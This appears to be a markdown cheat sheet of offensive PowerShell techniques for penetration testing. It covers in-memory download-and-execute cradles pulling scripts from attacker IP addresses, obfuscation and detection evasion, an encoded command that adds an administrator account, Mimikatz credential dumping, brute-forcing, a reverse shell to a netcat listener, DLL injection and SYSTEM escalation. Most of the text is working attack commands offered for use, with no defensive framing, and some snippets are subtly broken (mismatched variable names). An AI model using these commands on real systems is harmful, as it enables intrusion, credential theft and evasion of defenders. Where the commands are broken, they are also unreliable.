# Powershell

--- 

### Downloading & Executing

> See [Invoke-CradleCrafer](https://github.com/danielbohannon/Invoke-CradleCrafter) as a tool to obfuscate download cradles.

> Include `-ExecutionPlicy Bypass` and `-Window Hidden` option to ensure scripts run and the PowerShell Window stays hidden from the end user.

Execute a file with `&`:
```powershell
$local_file = "C:\programdata\payload.exe"
& $local_file
```

Run in memory with `Net.WebClient`:
- in Powershell: `iex (New-Object Net.Webclient).DownloadString("http://<url>")`
- in command prompt: `powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<url>')`

Run in memory with `System.Xml.XmlDocument`:
1. create XML file with PowerShell commands:
	```xml
	<?xml version="1.0" ?>
	<command>
		<a>
			<execute>Get-Process</execute>
		</a>
	</command>
	```
2. use `load` method to download and execute:
	```powershell
	$xmldoc = New-Object System.Xml.XmlDocument
	$xmldoc.Load("http://<url>/file.xml")
	iex $xmldoc.command.a.execute
	```

Run in memory with `Msxml2.XMLHTTP` COM object: 
```powershell
$download = New-Object -ComObject Msxml2.XMLHTTP
$download.open("GET", "http://<url>", $false)
$downloader.send()
iex $downloader.response.Text
```

Run in memory with `WinHttp.WinHttpRequest.5.1` COM object:
```powershell
$download = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$download.open("GET", "http://<url>", $false)
$downloader.send()
iex $downloader.response.Text
```


Download to disk:
- `New-Object Net.Webclient).DownloadFile("http://<url>")`
- `powershell.exe (New-Object Net.Webclient).DownloadFile('http://<url>)`

Using system's proxy and default credentials:
```powershell
$downloader = New-Object System.Net.WebClient
$payload = "https://192.168.22.14/Get-ProcessPaths.ps1"
$command = $downloader.DownloadString($payload)
$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$downloader.Proxy = $proxy
iex $command
```

Evasion tips:
- have SSL certificate configured on attacker machine to evade over-the-wire heuristics
- evade basic file extension heuristics by giving PowerShell script downloaded a different extension (i.e. `logo.gif`)
- use a custom user-agent string when sending requests to attacker URL to evade detection mechanisms that are flagging abnormal user-agent strings crossing the wire by using the `Headers.Add` method:
	```powershell
	$downloader = New-Object System.Net.WebClient
	$downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ApplceWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
	$payload = "https://192.168.22.14/Get-ProcessPaths.ps1"
	$command = $downloader.DownloadString($payload)
	iex $command
	```




<br>

### Obfuscation

> Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework

Setup:
1. clone the repo and navigate into this directory 
2. next, from Powershell instance inside this directory run `Import-Module Invoke-Obfuscation`

Usage:
1. in the module run `SET SCRIPTBLOCK <powrshell_command`
	- i.e. `SET SCRIPTBLOCK iex (New-Object Net.Webclient).DownloadString("http://192.148.12.3/script.ps1")`
2. select the obfuscation method
	- i.e. `STRING` -> `3` -- to obfuscate by reversing the string
	- i.e. `ENCODING` -> `7` -- to encode the command as special characters
3. copy the obfuscated command generated to victim machine and run 
	- to run from the command prompt use `powershell -Command "<cmd>"`

Using "launcher":
- you can also use framework to create obfuscated launcher commands to run the obfuscated code with the `LAUNCHER` option 
- i.e. `[create obfuscated powershell cmd]` -> `LAUNCHER` -> `RUNDLL` -> `0` -- to create an obfuscated command that uses rundll32.exe to launch obfuscated powershell code on the target 


Powershell's "obfuscation" method:
1. encode Powershell command to base64:
	```powershell
	$command = 'net user admin1 "Password123" /ADD; net localgroup administrators admin1 /add'
	$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
	$encodedCommand = [Convert]::ToBase64String($bytes)
	Write-Host $encodedCommand
	```
2. copy command to target and decode to run:
	- i.e. `powershell.exe -EncodedCommand <poweshell_cmd>`	
	
	
	
<br>

### Information Gathering & Recon

Basic port scan:
```powershell
$ports = (80,8080,443,22)
$ip = "1.1.1.1"
foreach ($port in $ports) {
	try {
		$socket=New-Object System.Net.Sockets.TcpClient($ip,$port)
	}
	catch {}
	if ($socket -eq $null) {
		echo $ip":"$port" - closed"
	} else {
		echo $ip":"$port" - open"
	}
	$socket = $null
}
```


With [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) framework:
- first, load framework to the host
- ping scan: `Invoke-Portscan -Hosts "192.168.3.1/24" -PingOnly`
- ping scan from file: `Invoke-Portscan -HostFile ips.txt -PingOnly`
- ping scan with saved CSV results: `Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\ping_scan.csv`
- port scan: `Invoke-Portscan -HostFile live_hosts.txt -ports "53-81"`
- port scan with grep-able output: `Invoke-Portscan -HostFile live_hosts.txt -oG port_scan.gnmap -f -ports "1-81"`
- enumerating web server resources: `Get-HttpStatus -Target 192.168.3.51 -Path dictionary.txt -Port 80 | ? {$_.Status -match "ok"}`


With [Posh-SecMod](https://github.com/darkoperator/Posh-SecMod) framework:
- first, load framework to the host
- view commands: `Get-Command -Module Posh-SecMod`
- ARP scan: `Invoke-ARPScan -CIDR 192.168.3.1/24` (quieter than a standard SYN or TCP scan)
- reverse DNS lookup: `Invoke-ReverseDnsLookup -CIDR 192.168.3.0/24`
- also included are `Resolve-HostRecord` and `Resolve-DNSRecord`


<br>

### Post-Exploitation

> [Empire](https://github.com/EmpireProject/Empire) is a great post-exploitation framework which his pure PowerShell and lets you easily gather information, move laterally, maintain persistence, and integrates with Metasploit.

With [Nishang](https://github.com/samratashok/nishang) framework:
- download via an obfuscated download cradle and execute in memory (i.e. `iex (New-Object Net.WebClient).DownloadString("<url>"); <cmdlet>`)
	- i.e. `iex (New-Object Net.WebClient).DownloadString("http://192.4.11.5/Invoke-Mimikatz"); Invoke-Mimikatz -DumpCreds`
- Gather modules:
	- to copy the SAM database using the VSS service use `Copy-VSS`
	- to get system information use `Get-Information`
	- to dump saved password hints for users on the system `Get-PassHints`
	- to dump clear-text credentials (or hashes) from memory `Invoke-Mimikatz -DumpCreds`
- brute forcing MSSQL, active directory, web, and FTP:
	- i.e. `Inovke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose`
- reverse Powershell shell (netcat):
	1. setup netcat listener with `nc -lvnp 4444`
	2. on target machine run `Invoke-PowerShellTcp` cmdlet
		- `powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://<url>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <listener_ip> -Port 4444`
	- note, traffic will be traversing the wire in clear-text so could be detected by over-the-wire heuristics (SIEM)
	- nishang has several different shell, both bind, reverse, ICMP, UDP, and more complex "rat" type shells 
- nishang has a host of other modules that can be used for the post-exploitation process


With [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) framework:
- to run privilege escalation script [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
	1. download module 
	2. load module with `Import-Module .\Privesc.psm1`
	3. show commands with `Get-Command -Module Privesc`
	4. run all commands with `Invoke-AllChecks`
	- generate a HTML report with `Invoke-AllChecks -HTMLReport`
- DLL injection:
	1. created DLL that runs `cmd.exe` with `msfvenom -p windows/exec CMD="cmd.exe" -f dll -o cmd.dll` (could use a meterpreter or reverse shell instead)
	2. download malicious DLL to target with `iex (New-Object Net.WebClient).DownloadFile("http://<url>/cmd.dll", "c:\programdata\cmd.dll")`
	3. find a process to inject DLL into and get PID
		- i.e. `ps | ? {$_.ProcessName -match "notepad"}`
	4. inject DLL using `Invoke-DLLInjection` cmdlet
		- i.e.  `iex (New-Object Net.WebClient).DownloadString("http://<url>/Invoke-DLLInjection.ps1"); Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll`

Evade application whitelisting with [psgetsystem](https://github.com/decoder-it/psgetsystem):
- psgetsystem allows you to get SYSTEM privileges via a parent process, when then spawns a child process which effectively inherits the SYSTEM access privileges of the parent 
- you need to run as Administrator to do this, but its a great way to evade application whitelisting solutions by being able to inject yourself into an already signed or other trusted process
1. download to target and import with `. .\psgetsys.ps1`
2. find a SYSTEM process to piggyback into with `Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} |  Format-List -Property Username,Name,Id` and record PID
3. run `[MyProcess]::CreateProcessFromParent(<pid>,"cmd.exe")`
- in an attack scenario you could easily launch a meterpreter executable payload as SYSTEM



